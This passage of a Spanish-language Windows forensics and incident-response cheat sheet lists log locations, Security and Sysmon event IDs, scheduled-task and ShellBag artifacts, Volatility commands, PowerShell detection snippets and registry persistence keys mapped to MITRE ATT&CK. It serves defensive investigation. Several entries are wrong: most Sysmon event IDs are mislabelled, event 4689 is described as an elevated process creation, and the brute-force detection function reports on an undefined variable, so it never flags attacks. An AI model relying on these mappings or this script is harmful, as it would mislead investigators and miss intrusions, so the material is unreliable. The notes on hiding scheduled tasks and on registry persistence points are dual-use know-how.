| `%SYSTEMROOT%\INF\setupapi.dev.log` | Contiene información de unidades Plug and Play y la instalación de drivers | Versión de SO, Kernel, Service Pack, arquitectura, modo de inicio, fechas, rutas, lista de drivers, dispositivos conectados, dispositivos iniciados o parados |
| `%SYSTEMROOT%\INF\setupapi.app.log` | Contiene información del registro de instalación de las aplicaciones | Fechas, rutas, sistema operativo, versiones, ficheros, firma digital, dispositivos |
| `%SYSTEMROOT%\Performance\Winsat\winsat.log` | Contiene registros de utilización de la aplicación WINSAT que miden el rendimiento del sistema | Fechas, valores sobre la tarjeta gráfica, CPU, velocidades, puertos USB |
| `%ProgramData%\Microsoft\Windows Defender\Support` | Contiene pruebas históricas de WD (Windows Defender). Los nombres de los archivos serán- MPLog-\*.log, MPDetection-\*.log, MPDeviceControl-\*.log | Fechas, versiones productos, servicios, notificaciones, CPU, ProcessImageName, EstimatedImpact, binarios, etc. |
| `%ProgramData%\Microsoft\Windows Defender\Scans\Scans\History` | Cuando se detecta una amenaza, WD almacena un archivo binario "DetectionHistory" | Se pueden analizar estos archivos utilizando herramientas como DHParser |
| `%TMP%` o `%TEMP%` | Variable de entorno que apunta a la ruta absoluta "%USERPROFILE%\AppData\Local\Temp" donde se almacenan ficheros temporales en el contexto de usuario. Este directorio almacena la creación de archivos de volcado de un proceso cuando se realiza a través del taskmanager. En el contexto de sistema apunta a la ruta absoluta "C:\Windows\Temp" |

### 📜 Lista de Events ID de Windows y Sysmon relevantes en investigaciones DFIR

Los sistemas Windows almacenan los registros en el directorio `%SystemRoot%\System32\winevt\logs` por defecto en el formato binario XML Windows Event Logging, designado por la extensión .evtx. Los registros también se pueden almacenar de forma remota mediante suscripciones de registro. Los eventos pueden registrarse en los registros de eventos de Seguridad, Sistema y Aplicación. 

El registro de eventos de instalación registra las actividades que se produjeron durante la instalación de Windows. El registro de eventos Forwarded Logs es la ubicación predeterminada para registrar los eventos recibidos de otros sistemas. Pero también hay muchos registros adicionales, listados bajo "Registros de aplicaciones y servicios" en el Visor de Eventos que registran detalles relacionados con tipos específicos de actividades.

**Formato Event Log (XML Windows Event Logging)**

| Campo | Descripción |
|-------|-------------|
| Log Name | El nombre del Registro de Eventos donde se almacena el evento. Útil cuando se procesan numerosos registros extraídos del mismo sistema. |
| Source | El servicio, componente de Microsoft o aplicación que generó el evento. |
| Event ID | Un código asignado a cada tipo de actividad auditada. |
| Level | La gravedad asignada al evento en cuestión. |
| User | La cuenta de usuario implicada en la activación de la actividad o el contexto de usuario con el que se estaba ejecutando el origen cuando registró el evento. Hay que tener en cuenta que este campo a menudo indica "System" o un usuario que no es la causa del evento que se está registrando. |
| OpCode | Asignado por la fuente que genera el registro. Su significado queda a criterio de la fuente (Source). |
| Logged | La fecha y hora del sistema local en que se registró el evento. |
| Task Category | Asignada por la fuente que genera el registro. Su significado depende de la fuente (Source). |
| Keywords | Asignada por la fuente y utilizadas para agrupar o clasificar eventos. |
| Computer | El equipo en el que se registró el evento. Esto es útil cuando se examinan registros recogidos de múltiples sistemas, pero no debe ser considerado como el dispositivo que causó un evento (como cuando se inicia una sesión remota, el campo "Computer" seguirá mostrando el nombre del sistema que registra el evento, no la fuente de la conexión). |
| Description | Un bloque de texto donde se registra información adicional específica del evento que se está registrando. Suele ser el campo más importante para el analista. |

- Windows Event Log Analyst Reference (Applied Incident Response).
  + https://forwarddefense.com/media/attachments/2021/05/15/windows-event-log-analyst-reference.pdf

- Buscar Events ID: Windows Security Log Events Encyclopedia (Ultimate IT Security - @randyfsmith).
  + https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/default.aspx

- Apéndice de identificadores de eventos.
  + https://learn.microsoft.com/es-es/windows-server/identity/ad-ds/plan/appendix-l--events-to-monitor

- Inicio de Sesión y Autenticación:
```
540: Inicio de sesión de red exitoso.
4624: Se inició sesión exitosamente en un sistema a través de una cuenta válida. (Según el Logon Type indicará el método de conexión de la sesión).
4625: Fallo en el inicio de sesión de una cuenta. (Hay que tener en cuenta que los inicios de sesión fallidos a través de RDP -acceso por red- pueden registrarse como Tipo 3 en lugar de Tipo 10 -sesión remota-, dependiendo de los sistemas involucrados).
4634: Cierre de sesión exitoso.
4647: Cierre de sesión iniciado por el usuario.
4648: Se intentó un inicio de sesión utilizando credenciales explícitas.
4740: Se bloqueó una cuenta de usuario.
4672: Se conceden ciertos privilegios asociados con el acceso elevado o de administrador a un inicio de sesión.
4767: Se desbloqueó una cuenta de usuario.
4772: Error en una solicitud de ticket de autenticación Kerberos.
4768: Se solicitó un ticket de autenticación Kerberos (TGT).
4771: La autenticación previa de Kerberos falló.
4777: El controlador de dominio no pudo validar las credenciales de una cuenta.
4778: Se volvió a conectar una sesión a una estación Windows.
4779: Se desconecta una sesión. También puede ocurrir cuando una sesión es reconectada a través de RDP.
4820: Se denegó un ticket de concesión de tickets (TGT) de Kerberos porque el dispositivo no cumple con las restricciones de control de acceso.
4964: Se asignaron grupos especiales a un nuevo inicio de sesión.
```

- Event ID 4624. Códigos de resultado Logon type:

| Logon Type | Descripción |
|------------|-------------|
| 2 | **Interactive**. Como el inicio de sesión en el teclado y la pantalla del sistema, o de forma remota utilizando herramientas de acceso remoto de terceros como VNC, o psexec con el modificador -u. Los inicios de sesión de este tipo almacenarán en caché las credenciales del usuario en la memoria RAM durante la duración de la sesión y pueden almacenar en caché las credenciales del usuario en el disco. |
| 3 | **Network**. Como el acceso a una carpeta compartida en este ordenador desde otro lugar de la red. Esto representa un inicio de sesión no interactivo, que no almacena en caché las credenciales del usuario en la RAM ni en el disco. |
| 4 | **Batch** (indica una tarea programada). El tipo de inicio de sesión por lotes se utiliza en servidores por lotes, donde los procesos pueden ejecutarse en nombre de un usuario sin su intervención directa. |
| 5 | **Service**. Indica que un servicio fue iniciado por el Service Control Manager (SCM). |
| 7 | **Unlock**. Indica que una estación de trabajo desatendida con una pantalla protegida por contraseña está desbloqueada. |
| 8 | **NetworkCleartext**. Indica que un usuario inició sesión en este ordenador desde la red y que la contraseña del usuario se pasó al paquete de autenticación en su forma no hash. Todos los paquetes de autenticación incorporados hacen hash de las credenciales antes de enviarlas a través de la red. Las credenciales no atraviesan la red en texto claro. La mayoría de las veces indica un inicio de sesión en Internet Information Services (IIS) con autenticación básica. |
| 9 | **NewCredentials**. Indica que un usuario inició sesión con credenciales alternativas para realizar acciones, como con RunAs o asignando una unidad de red. Si desea realizar un seguimiento de los usuarios que intentan iniciar sesión con credenciales alternativas, buscar también el ID de evento 4648. |
| 10 | **RemoteInteractive**. Indica que Terminal Services, Remote Desktop o Remote Assistance para un inicio de sesión interactivo. Véase la nota sobre RDP al final de esta sección para más detalles. |
| 11 | **CachedInteractive**. Inicio de sesión con credenciales de dominio almacenadas en caché, como cuando se inicia sesión en un portátil cuando se está fuera de la red. No se contactó con el controlador de dominio para verificar la credencial, por lo que no se genera ninguna entrada de inicio de sesión de cuenta. |

- Event ID 4625. Códigos de fallos de inicio sesión (Logon failure): 
```
0XC000005E: Actualmente no hay servidores de inicio de sesión disponibles para atender la solicitud de inicio de sesión.
0xC0000064: Inicio de sesión de usuario con una cuenta de usuario mal escrita o incorrecta.
0xC000006A: Inicio de sesión de usuario con contraseña mal escrita o incorrecta.
0XC000006D: Esto se debe a un nombre de usuario incorrecto o a una información de autenticación incorrecta.
0XC000006E: Nombre de usuario desconocido o contraseña incorrecta.
0xC000006F: Inicio de sesión de usuario fuera del horario autorizado.
0xC0000070: Inicio de sesión de usuario desde estación de trabajo no autorizada.
0xC0000071: Inicio de sesión de usuario con contraseña caducada.
0xC0000072: Inicio de sesión de usuario en cuenta desactivada por el administrador.
0XC00000DC: Indica que el servidor se encontraba en un estado incorrecto para realizar la operación deseada.
0XC0000133: Relojes entre el controlador de dominio y el otro equipo demasiado desincronizados.
0XC000015B: No se ha concedido al usuario el tipo de inicio de sesión solicitado (también conocido como derecho de inicio de sesión) en este equipo.
0XC000018C: La solicitud de inicio de sesión ha fallado porque ha fallado la relación de confianza entre el dominio principal y el dominio de confianza.
0XC0000192: Se ha intentado iniciar sesión, pero no se ha iniciado el servicio Netlogon.
0xC0000193: Inicio de sesión de usuario con cuenta caducada.
0XC0000224: Se solicita al usuario que cambie la contraseña en el próximo inicio de sesión.
0XC0000225: Evidentemente se trata de un error de Windows y no de un riesgo.
0xC0000234: El usuario inicia sesión con la cuenta bloqueada.
0XC00002EE: Razón del fallo: Se ha producido un error durante el inicio de sesión.
0XC0000413: Error de inicio de sesión: La máquina en la que está iniciando sesión está protegida por un cortafuegos de autenticación. La cuenta especificada no puede autenticarse en la máquina.
```

- Event ID 4768. Códigos de resultado comunes:

| Dec | Hex | Descripción |
|-----|-----|-------------|
| 6 | 0x6 | Nombre de usuario no válido. |
| 12 | 0xC | Restricción de política que prohíbe este inicio de sesión (como una restricción del equipo o una restricción horaria). |
| 18 | 0x12 | La cuenta está bloqueada, deshabilitada o ha caducado. |
| 23 | 0x17 | La contraseña de la cuenta ha caducado. |
| 24 | 0x18 | La contraseña es incorrecta. |
| 32 | 0x20 | El ticket ha caducado (común en cuentas de equipo). |
| 37 | 0x25 | La desviación del reloj es demasiado grande. |

- Cuentas de usuario AD:
```
4720: Se creó una cuenta de usuario.
4722: Se habilitó una cuenta de usuario.
4723: Se cambió una cuenta de usuario.
4724: Se intentó restablecer la contraseña de una cuenta.
4725: Se deshabilitó una cuenta de usuario.
4726: Se eliminó una cuenta de usuario.
4738: Se cambió una cuenta de usuario.
4781: Se cambió el nombre de una cuenta.
4782: Se accedió al hash de contraseña de una cuenta.
```

- Grupos AD:
```
4731: Se creó un grupo local con seguridad habilitada.
4727: Se creó un grupo global habilitado para seguridad.
4754: Se creó un grupo universal habilitado para seguridad.
4744: Se creó un grupo local con seguridad deshabilitada.
4749: Se creó un grupo global con seguridad deshabilitada.
4759: Se creó un grupo universal con seguridad deshabilitada.
4735: Se cambió un grupo local habilitado para seguridad.
4737: Se cambió un grupo global habilitado para seguridad.
4755: Se cambió un grupo universal habilitado para seguridad.
4745: Se cambió un grupo local con seguridad deshabilitada.
4750: Se cambió un grupo global con seguridad deshabilitada.
4760: Se cambió un grupo universal con seguridad deshabilitada.
4734: Se eliminó un grupo local con seguridad habilitada.
4730: Se eliminó un grupo global con seguridad habilitada.
4758: Se eliminó un grupo universal con seguridad habilitada.
4748: Se eliminó un grupo local con seguridad deshabilitada.
4753: Se eliminó un grupo global con seguridad deshabilitada.
4763: Se eliminó un grupo universal con seguridad deshabilitada.
4732: Se agregó un miembro a un grupo local con seguridad habilitada.
4728: Se agregó un miembro a un grupo global con seguridad habilitada.
4756: Se agregó un miembro a un grupo universal con seguridad habilitada.
4746: Se agregó un miembro a un grupo local con seguridad deshabilitada.
4751: Se agregó un miembro a un grupo global con seguridad deshabilitada.
4761: Se agregó un miembro a un grupo universal con seguridad deshabilitada.
4733: Un miembro fue eliminado de un grupo local con seguridad habilitada.
4729: Un miembro fue eliminado de un grupo global con seguridad habilitada.
4757: Un miembro fue eliminado de un grupo universal con seguridad habilitada.
4747: Un miembro fue eliminado de un grupo local con seguridad deshabilitada.
4752: Un miembro fue eliminado de un grupo global con seguridad deshabilitada.
4762: Un miembro fue eliminado de un grupo universal con seguridad deshabilitada.
```

- Servicios de federación de Active Directory (AD FS):
```
1202: El Servicio de federación validó una nueva credencial.
1203: El Servicio de federación no pudo validar una nueva credencial.
4624: Se ha iniciado sesión correctamente en una cuenta.
4625: No se pudo iniciar sesión en una cuenta.
```

- Active Directory Certificate Services (AD CS):
```
4870: Servicios de certificados revoca un certificado.
4882: Se cambiaron los permisos de seguridad para Servicios de certificados.
4885: Se cambió el filtro de auditoría para Servicios de certificados.
4887: Servicios de certificados aprobó una solicitud de certificado y emitió un certificado.
4888: Servicios de certificado denegado una solicitud de certificado.
4890: la configuración del administrador de certificados para Servicios de certificados ha cambiado.
4896: se han eliminado una o varias filas de la base de datos de certificados.
```

- Otros eventos AD:
```
1644: Búsqueda LDAP.
4662: Se realizó una operación en un objeto.
4741: Cuenta de equipo agregada.
4743: Cuenta de equipo eliminada.
4776: El controlador de dominio ha intentado validar las credenciales de una cuenta (NTLM).
5136: Se modificó un objeto de servicio de directorio.
5137: Se creó un objeto de servicio de directorio.
```

- Códigos de error de inicio de sesión (Event ID 4776):
```
0xC0000064: El nombre de usuario no existe.
0xC000006A: El nombre de usuario es correcto pero la contraseña es incorrecta.
0xC000006D: Fallo genérico de inicio de sesión. Posiblemente nombre de usuario o contraseña incorrectos o desajuste en el nivel de autenticación de LAN Manager entre los equipos de origen y destino.
0xC000006F: El usuario intentó iniciar sesión fuera de sus restricciones de día de la semana u hora del día.
0xC0000234: El usuario está bloqueado.
0xC00000193: Expiración de la cuenta.
0xC0000070: Restricción del puesto de trabajo.
0xC0000071: Contraseña caducada.
0xC0000072: La cuenta está desactivada.
0xC0000133: Relojes entre el DC y el otro equipo demasiado desincronizados.
0xC0000224: El usuario debe cambiar la contraseña en el siguiente inicio de sesión.
0xC0000225: Evidentemente, se trata de un error de Windows y no de un riesgo.
0xC000015b: Al usuario no se le ha concedido el tipo de solicitado (también conocido como derecho de inicio de sesión) en este equipo.
0xc0000371: El almacén de cuentas local no contiene material secreto para la cuenta especificada.
```

- Códigos de error de Kerberos:
```
0x6: Nombre de usuario incorrecto.
0x7: Nueva cuenta de equipo.
0x9: El administrador debe restablecer la contraseña.
0xC: Restricción del puesto de trabajo.
0x12: Cuenta desactivada, caducada, bloqueada, restricción de horas de inicio de sesión.
0x17: La contraseña del usuario ha caducado.
0x18: Contraseña incorrecta.
0x20: Las cuentas del equipo se registran con frecuencia.
0x25: El reloj de la estación de trabajo está demasiado desincronizado con el del DC.
```

- Cambios en Políticas y Configuración:
```
1102: Se ha eliminado el registro de eventos de "Security" (este evento se mostrará en "Security").
104: Se ha eliminado el registro de eventos de un log específico. "Application", "System" o cualquiera de los registros de aplicaciones y servicios (este evento se mostrará en "System").
4657: Se modificó un valor de registro.
4616: Se cambió la hora del sistema.
```

- Acceso a Archivos y Objetos:
```
4663: Se intentó acceder a un objeto.
4656: Se solicitó un identificador para un objeto.
4659: Se solicitó un identificador de un objeto con la intención de eliminarlo.
4660: Se eliminó un objeto.
4670: Se cambiaron los permisos sobre un objeto.
```

- Eventos de Procesos, Servicios y Tareas programadas:
```
4688: Se generó un nuevo proceso.
4689: Se generó un nuevo proceso con privilegios elevados.
4697: Se instaló un servicio en el sistema.
7045: Un nuevo servicio fue instalado o configurado.
7040: Cambio del tipo de inicio de servicio (deshabilitado, manual, automático).
7036: Iniciar o detener un servicio.
4698: Se creó una tarea programada.
4699: Se eliminó una tarea programada.
4700: Se habilitó una tarea programada.
4701: Se deshabilitó una tarea programada.
4702: Se actualizó una tarea programada.
```

- Eventos de Red y Conexiones:
```
4946: Se agregó una regla a la lista de excepciones del Firewall de Windows.
4947: Se realizó un cambio en la lista de excepciones del Firewall de Windows.
4950: Se cambió una configuración del Firewall de Windows.
4954: La configuración de la política de grupo del Firewall de Windows ha cambiado. Se han aplicado las nuevas configuraciones.
4956: El Firewall de Windows ha cambiado el perfil activo.
4957: El Firewall de Windows no aplicó la siguiente regla.
5025: El servicio de Firewall de Windows se detuvo.
5031: El Firewall de Windows bloqueó una aplicación que acepta conexiones entrantes.
5158: Una regla de firewall de Windows fue aplicada.
5152: La plataforma de filtrado de Windows bloqueó un paquete.
5153: Un filtro más restrictivo de la plataforma de filtrado de Windows ha bloqueado un paquete.
5155: La plataforma de filtrado de Windows ha bloqueado una aplicación o servicio para que no escuche en un puerto las conexiones entrantes.
5156: La plataforma de filtrado de Windows ha permitido una conexión.
5157: La plataforma de filtrado de Windows ha bloqueado una conexión.
5447: Se ha cambiado un filtro de la plataforma de filtrado de Windows.
```

- Eventos de Reinicio, Apagado e Inicio del Sistema:
```
6005: El servicio de registro de eventos de Windows ha sido iniciado (Se considera un equivalente a "El sistema se ha iniciado").
6006: El servicio de registro de eventos de Windows se ha detenido correctamente (Se considera un equivalente a "El sistema se ha apagado o reiniciado").
6008: El sistema se apaga o reinicia inesperadamente.
1074: Un usuario o un proceso inicia un apagado o reinicio del sistema de manera intencionada.
1076: Registra la razón del último apagado del sistema si fue forzado por un usuario.
1: Registra la duración del proceso de arranque del sistema (Kernel-Boot).
12: El sistema se ha iniciado correctamente (Kernel-General).
13: El sistema se ha apagado correctamente (Kernel-General).
```

- Eventos de dispositivos USB (PNP, Plug and Play)
```
6416: El sistema ha reconocido un nuevo dispositivo externo conectado.
10000: Primera conexión dispositivo USB.
20001: Instalación o actualización de UserPNP.
24576: Instalación correcta de controladores WPD (Windows Portable Devices).
```

- Eventos AppLocker
```
8003, 8006: Se permitió la ejecución de <Nombre de archivo> pero se habría impedido su ejecución si se hubiera aplicado la política de AppLocker.
8004: Se ha impedido la ejecución de <Nombre de archivo>.
8005: Se permitió la ejecución de <Nombre de archivo>.
8007: Se ha impedido la ejecución de <Nombre de archivo>.
8023: Se permitió la instalación de *<Nombre de archivo>.
8025: Se ha impedido la ejecución de *<Nombre de archivo>.
8028: Se permitió la ejecución de <Nombre de archivo> pero se habría impedido si se hubiera aplicado la política Config CI.
8029: Se impidió la ejecución de <Nombre de archivo> debido a la política Config CI.
```

- Eventos **Sysmon** 
  + https://learn.microsoft.com/es-es/sysinternals/downloads/sysmon#events

```bash
# Inicio de Sesión y Autenticación:
1: Creación de proceso. Puede indicar la ejecución de herramientas de autenticación o credenciales.

# Creación y Término de Procesos:
1: Creación de proceso.
5: Término de proceso. Puede ayudar a identificar la ejecución y finalización de herramientas maliciosas.

# Cambios en el Registro:
12: Cambio en una clave de registro. Puede indicar cambios maliciosos en la configuración del sistema.

# Acceso a Archivos y Objetos:
8: Creación de archivo. Puede indicar la creación de archivos maliciosos.
11: Creación de archivo. Puede indicar la creación de archivos temporales o de configuración.
17: Cambio en la propiedad de archivo. Puede indicar cambios maliciosos en archivos importantes.

# Conexiones de Red:
3: Conexión de red establecida. Puede ayudar a identificar conexiones a recursos externos.
4: Conexión de red terminada. Puede indicar actividad de red sospechosa.

# Carga de Módulos y Controladores:
7: Carga de imagen en un proceso. Puede indicar la carga de módulos maliciosos.

# Detección de Firmas de Malware:
16: Detección de imagen. Puede indicar la detección de malware por parte de Sysmon.

# Creación de Servicios y Controladores:
17: Creación de servicio. Puede indicar la creación de servicios maliciosos.

# Cambio de Rutas de Acceso de Archivos:
18: Cambio de ruta de acceso de archivo. Puede indicar cambios en la ubicación de archivos sospechosos.
```

### 📜 Artefactos de Tareas programadas en Windows

Distintas formas de poder visualizar y/o extraer información de las tareas programadas creadas en Windows.

GUI Windows
```
taskschd.msc
```

Path de sistema
```
%SYSTEMROOT%\System32\Tasks
%SYSTEMROOT%\Tasks
```

Regedit
```
HKLM\Software\Microsoft\Windows NT\CurrentVersion\Schedule\Taskcache\Tasks
HKLM\Software\Microsoft\Windows NT\CurrentVersion\Schedule\Taskcache\Tree
```
> [!TIP]
> **Detectar tareas programadas ocultas creadas con fines de persistencia**
> 
> Revisar en la clave de *...\Schedule\Taskcache\Tree* el valor de "**Index**" será "**0**", esta técnica se usa para ocultar tareas programadas de forma intencionada, estas no se mostrarán a través de la consola "**taskschd.msc**" ni tampoco vía "**schtasks /query**". La única forma de detectarlas sería analizarlas vía Regedit.

PowerShell
```ps
Get-ScheduledTask
```

PowerShell usando el módulo PSScheduledJob
```ps
Import-Module PSScheduledJob
Get-ScheduledJob 
```

CMD
```cmd
schtasks
```

### 📜 Scripts para detectar actividades sospechosas en Windows

`Inicios de sesión remotos`

Analiza eventos de inicio de sesión exitosos para encontrar un inicio de sesión con tipos (3 o 10) que son los tipos de inicio de sesión remoto y RDP Desde allí podemos comenzar a investigar la IP que inició la conexión.
```ps
Get-WinEvent -FilterHashtable @{Logname = "Security" ; ID = 4624 } | where {$_.Properties[8].Value -eq 3 -or $_.Properties[8].Value -eq 10}
```

`Fuerza Bruta`

Para comprobar si BruteForcehay signos de ataque en los registros de eventos, podemos buscar varios login faildeventos con identificación 4625 en el registro de seguridad.
```ps
function BruteForceDetect {
    param (
        [string]$logName = "Security",
        [int]$eventID = 4625,
        [int]$failedAttemptsThreshold = 5,
        [int]$timeWindow = 60 # Ventana de tiempo en minutos para comprobar si hay intentos de inicio de sesión repetidos
    )

    $startTime = (Get-Date).AddMinutes(-$timeWindow)
    
    # Definir tabla hash del filtro
    $filterHash = @{
        LogName = $logName
        ID = $eventID
        StartTime = $startTime
    }

    $events = Get-WinEvent -FilterHashtable $filterHash

    $failedAttempts = @{}
    foreach ($event in $events) {
        $userName = $event.Properties[5].Value
        $sourceIPAddress = $event.Properties[19].Value

        if ($userName -and $sourceIPAddress) {
            if ($failedAttempts.ContainsKey($userName)) {
                $failedAttempts[$userName]++
            } else {
                $failedAttempts[$userName] = 1
            }
        }
    }

    $failedAttempts.GetEnumerator() | Where-Object { $_.Value -ge $failedAttemptsThreshold } | Sort-Object Value -Descending

    if ($bruteForceEvents.Count -gt 0) {
        # Fuerza bruta detectada
        Write-Host "Ataques de fuerza bruta detectados:"
        foreach ($entry in $bruteForceEvents) {
            Write-Host ("User: {0}, Intentos fallidos: {1}" -f $entry.Name, $entry.Value)
        }
    } else {
        Write-Host "No se detectaron ataques de fuerza bruta dentro del período de tiempo especificado."
    }
}
```

`Ataques binarios`

Windows tiene algunas mitigaciones contra la explotación utilizando algunas técnicas conocidas, como return-oriented programming "ROP"podemos encontrar los registros de las vulnerabilidades detectadas en el Microsoft-Windows-Security-Mitigations/UserModeregistro.
```ps
Get-WinEvent -FilterHashTable @{LogName ='Microsoft-Windows-Security-Mitigations/UserMode'} | Format-List -Property Id, TimeCreated
```

`Phishing`

Una de las formas más utilizadas de phishing es utilizar documentos de Office para lanzar otra carga útil oculta, por lo que supervisaré cualquier proceso generado por Word or Excelotros documentos de Office de la misma manera.
```ps
Get-SysmonEvents 1 | Where-Object { $_.Properties[20].Value -match "word|Excel" } | Format-List TimeCreated, @{label = "ParentImage" ; Expression = {$_.properties[20].value}}, @{label= "Image" ; Expression= {$_.properties[4].value}}
```

`Manipulación de servicios`

Una forma de detectar servicios de manipulación mediante la línea de comandos es monitorear el uso de Sc.exeejecutables.
```ps
Get-SysmonEvents 1 | Where-Object { $_.Properties[4].Value -match "\\sc.exe" } | Format-List TimeCreated, @{label = "ParentImage" ; Expression = {$_.properties[20].value}}, @{label= "Image" ; Expression= {$_.properties[4].value}},@{label = "CommandLine" ; Expression = {$_.properties[10].value}}
```

### 📜 Obtener software instalado y sus versiones (x86 y x64)

Consultando el registro de Windows. Efectivo y completo, donde se lista software instalado en arquitecturas x86 y x64 (Wow6432Node), tanto a nivel general del equipo (HKLM) como en el contexto del perfil de usuario (HKCU).
```ps
Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\*, `
                 HKCU:\Software\Microsoft\Windows\CurrentVersion\Uninstall\*, `
                 HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*, `
                 HKCU:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* | `
                 ? {![string]::IsNullOrWhiteSpace($_.DisplayName)} | `
                 Select-Object DisplayName, DisplayVersion, InstallDate | Sort-Object DisplayName -Unique
```
Usando WMI consultando la clase Win32_Product (no lista todo el software instalado como pasa en el método anterior).
```ps
Get-WmiObject -Query "SELECT * FROM Win32_Product" | Select-Object Name, Version, Vendor, InstallDate
Get-WmiObject -Class Win32_Product | Select-Object Name, Version, Vendor, InstallDate
```

### 📜 Análisis y artefactos de ShellBags

Shellbags son un conjunto de claves del registro que contienen detalles sobre la carpeta vista de un usuario, como su tamaño, posición e icono. Proporcionan marcas de tiempo, información contextual y muestran el acceso a directorios y otros recursos, lo que podría apuntar a evidencia que alguna vez existió. 

Se crea una entrada de shellbag para cada carpeta recién explorada, indicaciones de actividad, actuando como un historial de qué elementos del directorio pueden haberse eliminado de un sistema desde entonces, o incluso evidenciar el acceso de dispositivos extraíbles donde están ya no adjunto.

El análisis de Shellbag puede exponer información sobre:

- Accesos a carpetas.

Por ejemplo, elementos de escritorio, categorías/elementos del panel de control, letra de unidad, directorios o incluso archivos comprimidos.

- Evidencia de eliminación, sobrescritura o cambio de nombre de carpeta.
- Patrones transversales y de navegación de directorios.

Esto también podría incluir evidencia de acceso remoto (RDP o VNC), así como la eliminación de archivos binarios o el acceso a recursos de red.

**Artefactos de las Shellbags**

`NTUSER.DAT`
```
HKCU\Software\Microsoft\Windows\Shell\Bags
HKCU\Software\Microsoft\Windows\Shell\BagMRU
```

`USRCLASS.DAT`
```
HKCU\Software\Classes\Local Settings\Software\Microsoft\Windows\Shell\BagMRU
HKCU\Software\Classes\Local Settings\Software\Microsoft\Windows\Shell\Bags
```

Descripción de valores relevantes:

| Valor | Descripción |
|-------|-------------|
| `MRUListExt` | Valor de 4 bytes que indica el orden en el que se accedió por última vez a cada carpeta secundaria de la jerarquía BagMRU |
| `NodeSlot` | Contiene las preferencias de visualización y la configuración de shellbag |
| `NodeSlots` | Solo está en la clave raíz de BagMRU y se actualiza cada vez que se crea una nueva shellbag |

**Referencia detallada para la interpretación de ShellBags**

- https://www.4n6k.com/2013/12/shellbags-forensics-addressing.html

**Herramienta para explorar y análizar Shellbags tanto de forma online como offline**

-  **ShellBags Explorer** (GUI) o **SBECmd** (CLI): https://ericzimmerman.github.io/#!index.md

### 📜 Análisis de memoria RAM: Generación de línea temporal (Volatility 3)

Para crear una línea temporal de actividad del sistema, se pueden utilizar diferentes plugins de Volatility que permiten extraer artefactos de memoria relacionados con eventos del sistema, archivos y actividad del usuario.

`Timeliner`

El plugin *timeliner* genera una línea temporal de la actividad del sistema operativo a partir de distintos artefactos presentes en memoria, mostrando eventos relevantes junto con su fecha y hora para facilitar la reconstrucción de la actividad del sistema durante un incidente.

Recopila información de múltiples fuentes de memoria:

- Procesos y archivos.
- Eventos del sistema.
- Actividad del registro.

```ps
vol.py -f memory.raw windows.timeliner > timeline_timeliner.txt
```

`MFT Scan`

El plugin *mftscan* analiza estructuras del Master File Table (MFT) presentes en memoria, la base de datos principal del sistema de archivos NTFS, para obtener información sobre archivos y directorios.

Permite identificar artefactos como:

- Nombre del archivo.
- Timestamps (creación, modificación y acceso).
- Ubicación en disco.
- Archivos creados o modificados.
- Artefactos de archivos eliminados.
- Actividad reciente del sistema de archivos.

```ps
vol.py -f memory.raw windows.mftscan > timeline_mftscan.txt
```

`Shellbags`

El plugin *shellbags* permite analizar los artefactos Shellbags almacenados en el registro de Windows, que contienen información sobre carpetas abiertas por el usuario en el Explorador de Windows y resultan especialmente útiles para reconstruir su actividad incluso cuando los archivos o carpetas ya han sido eliminados.

Estos artefactos pueden revelar:

- Rutas de carpetas abiertas.
- Accesos a dispositivos USB.
- Acceso a recursos compartidos de red.
- Preferencias de visualización de carpetas.

```ps
vol.py -f memory.raw windows.registry.shellbags > timeline_shellbags.txt
```

### 📜 Detectar peristencia de ejecutables en el registro de Windows (técnicas basadas en la matriz de *MITRE ATT&CK*)

Detectar persistencia en claves del registro de Windows haciendo uso de comprobaciones de técnicas basadas en la matriz de *MITRE ATT&CK*.

Esta herramienta también compara dos shoots del registro para obtener el cambio de estado entre ambos y desde una perspectiva de persistencia (análisis de comportamiento).
- https://github.com/amr-git-dot/Corners

`Ramas relevantes del registro de Windows usadas para persistencia`

```bash
# Mittre Technique: T1547.001
HKCU:\Software\Microsoft\Windows\CurrentVersion\Run
HKCU:\Software\Microsoft\Windows\CurrentVersion\RunOnce
HKLM:\Software\Microsoft\Windows\CurrentVersion\Run
HKLM:\Software\Microsoft\Windows\CurrentVersion\RunOnce
HKLM:\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce
HKCU:\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce
HKLM:\Software\Microsoft\Windows\CurrentVersion\RunServices
HKCU:\Software\Microsoft\Windows\CurrentVersion\RunServices

# Mittre Technique: T1547.003
HKLM:\System\CurrentControlSet\Services\W32Time\TimeProviders

# Mittre Technique: T1547.010
HKLM:\SYSTEM\CurrentControlSet\Control\Print\Monitors

# Mittre Technique: T1547.012
HKLM:\SYSTEM\ControlSet001\Control\Print\Environments\Windows x64\Print Processors\winprint
HKLM:\SYSTEM\CurrentControlSet\Control\Print\Environments\Windows x64\Print Processors\winprint
HKLM:\SYSTEM\CurrentControlSet\Control\Print\Environments\Windows x86\Print Processors\winprint
HKLM:\SYSTEM\CurrentControlSet\Control\Print\Environments\Windows NT x86\Print Processors\winprint

# Mittre Technique: T1546.011
HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\Custom

# Mittre Technique: T1546.007
HKLM:\SOFTWARE\Microsoft\Netsh
```

`Ramas y valores creados en el registro de Windows usadas para persistencia`

```bash
# Mittre Technique: T1547.004
HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon - Userinit
HKLM:\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer - Run
HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer - Run
HKLM:\System\CurrentControlSet\Control\Session Manager - BootExecute

# Mittre Technique: T1547.002
HKLM:\SYSTEM\CurrentControlSet\Control\Lsa - Authentication Packages

# Mittre Technique: T1547.004
HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon - shell
HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon - shell

# Mittre Technique: T1547.005
HKLM:\SYSTEM\CurrentControlSet\Control\Lsa - Security Packages
HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\OSConfig - Security Packages

# Mittre Technique: T1037.001
HKCU:\Environment - UserInitMprLogonScript

# Mittre Technique: T1546.009
HKLM:\System\CurrentControlSet\Control\Session Manager\ - AppCertDlls

# Mittre Technique: T1546.010
